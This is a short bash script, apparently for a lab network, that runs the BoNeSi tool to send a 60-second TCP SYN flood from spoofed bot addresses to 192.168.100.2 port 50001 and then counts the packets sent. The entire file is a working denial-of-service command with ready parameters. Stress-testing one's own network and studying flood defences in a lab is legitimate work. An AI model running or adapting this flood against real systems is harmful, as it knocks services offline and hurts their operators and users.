#!/bin/bash

OUTPUT_FILE="bonesi_output.txt"

# BoNeSi TCP SYN Flood (60 seconds)
sudo timeout -s INT 60 bonesi -i bots.txt -p tcp -s 0 -d enp0s3 192.168.100.2:50001 > "$OUTPUT_FILE" 2>&1

TOTAL_PACKETS=$(grep -oP '\d+(?= packets in)' "$OUTPUT_FILE" | awk '{s+=$1} END {print s}')

echo "$TOTAL_PACKETS packets sent"